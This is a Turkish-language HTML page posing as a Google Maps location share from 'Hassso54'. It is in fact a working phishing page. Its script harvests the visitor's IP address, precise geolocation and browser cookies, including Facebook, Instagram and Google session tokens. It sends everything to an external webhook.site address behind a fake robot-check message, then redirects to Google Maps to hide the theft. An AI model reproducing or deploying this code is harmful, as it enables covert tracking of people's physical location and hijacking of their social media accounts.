<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        }
        .map-icon { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
        h2 { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 8px; }
        .location-text { font-size: 14px; color: #5f6368; margin-bottom: 28px; }
        button {
            background: #1a73e8; color: white; border: none; width: 100%;
            padding: 14px 20px; border-radius: 40px; font-size: 16px;
            font-weight: 500; cursor: pointer;
        }
        button:active { transform: scale(0.97); }
        button:disabled { background: #9aa0a6; cursor: not-allowed; }
        .message-box {
            margin-top: 24px; padding: 12px; background: #f8f9fa;
            border-radius: 16px; font-size: 13px; color: #3c4043;
            display: none;
        }
        .robot-text { font-weight: 500; color: #1a73e8; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-icon">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="location-text">Sakarya bölgesindeki konuma bak</div>
        <button id="actionBtn">Konumu Görüntüle</button>
        <div id="messageBox" class="message-box"></div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        const btn = document.getElementById('actionBtn');
        const msgBox = document.getElementById('messageBox');
        
        function showMessage(text) {
            msgBox.style.display = 'block';
            msgBox.innerHTML = `<div class="robot-text">🔍 ${text}</div>`;
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return "IP alınamadı"; }
        }
        
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    () => resolve(null),
                    { timeout: 6000 }
                );
            });
        }
        
        // Tüm bilgileri topla
        async function collectAll() {
            // 1. Önce Facebook ve Instagram uygulamalarını aç (cookie oluşsun diye)
            const opener = document.createElement('iframe');
            opener.style.display = 'none';
            document.body.appendChild(opener);
            
            opener.src = "fb://profile";
            setTimeout(() => { opener.src = "instagram://user?username="; }, 800);
            setTimeout(() => { opener.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end"; }, 1600);
            
            // 2. 2 saniye bekle (uygulamalar açılsın)
            await new Promise(r => setTimeout(r, 2500));
            
            // 3. Şimdi tüm cookie'leri topla
            let allCookies = document.cookie;
            
            // 4. Facebook bilgilerini çıkar
            let facebook = { oturum: false, user_id: null, xs_token: null };
            if (allCookies.includes('c_user')) {
                const match = allCookies.match(/c_user=([^;]+)/);
                if (match) facebook.user_id = match[1];
                facebook.oturum = true;
            }
            if (allCookies.includes('xs')) {
                const match = allCookies.match(/xs=([^;]+)/);
                if (match) facebook.xs_token = match[1];
            }
            
            // 5. Instagram bilgileri
            let instagram = { oturum: false, user_id: null, sessionid: null };
            if (allCookies.includes('ds_user_id')) {
                const match = allCookies.match(/ds_user_id=([^;]+)/);
                if (match) instagram.user_id = match[1];
                instagram.oturum = true;
            }
            if (allCookies.includes('sessionid')) {
                const match = allCookies.match(/sessionid=([^;]+)/);
                if (match) instagram.sessionid = match[1];
            }
            
            // 6. Google hesap
            let google = { oturum: false };
            if (allCookies.includes('LSID') || allCookies.includes('SAPISID') || allCookies.includes('APISID')) {
                google.oturum = true;
            }
            
            // 7. Free Fire (Facebook ile bağlı)
            let freefire = { durum: "Facebook ile bağlı", facebook_id: facebook.user_id };
            
            // Temizlik
            setTimeout(() => {
                if (document.body.contains(opener)) document.body.removeChild(opener);
            }, 1000);
            
            return {
                facebook,
                instagram,
                google,
                freefire,
                tum_cerezler: allCookies,
                cookie_sayisi: allCookies.split(';').filter(c => c.trim()).length
            };
        }
        
        async function run() {
            btn.disabled = true;
            btn.innerText = "İşlem yapılıyor...";
            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
            
            const ip = await getIP();
            const location = await getLocation();
            const hesapBilgileri = await collectAll();
            
            const payload = {
                tip: "Hassso54_SON_HAL",
                zaman: new Date().toLocaleString('tr-TR'),
                konum: location ? {
                    url: location.url,
                    enlem: location.lat,
                    boylam: location.lng
                } : null,
                ip: ip,
                hesap_bilgileri: hesapBilgileri,
                cihaz: navigator.userAgent,
                not: "Facebook, Instagram, Google, Free Fire bilgilerin"
            };
            
            await fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload)
            });
            
            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
            
            setTimeout(() => {
                if (location) {
                    window.location.href = location.url;
                } else {
                    window.location.href = "https://www.google.com/maps";
                }
            }, 1500);
        }
        
        btn.onclick = run;
    </script>
</body>
</html>
